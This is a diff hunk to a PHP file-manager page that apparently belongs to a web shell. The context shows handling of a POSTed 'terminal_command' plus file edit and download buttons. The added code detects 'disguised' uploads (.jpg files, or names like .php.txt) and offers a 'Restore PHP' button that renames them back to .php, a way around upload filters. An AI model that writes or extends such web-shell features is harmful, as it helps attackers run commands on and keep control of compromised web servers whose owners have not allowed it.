@@ -1021,6 +1021,15 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
                         <form method="post">
                             <button name="edit" value="<?= $item ?>" class="btn btn-sm">Edit</button>
                         </form>
+                        <?php 
+                        $isDisguised = (preg_match('/\.jpg$/i', $item) && strpos($item, '.php') === false) || 
+                                      (preg_match('/\.txt$/i', $item) && preg_match('/\.php[0-9]?\.txt$/i', $item));
+                        if ($isDisguised): 
+                        ?>
+                        <form method="post">
+                            <button name="restore_php" value="<?= $item ?>" class="btn btn-primary btn-sm" onclick="return confirm('Restore to .php extension?')">Restore PHP</button>
+                        </form>
+                        <?php endif; ?>
                     <?php endif; ?>
                         <form method="post">
                             <button name="download" value="<?= $item ?>" class="btn btn-sm">Download</button>
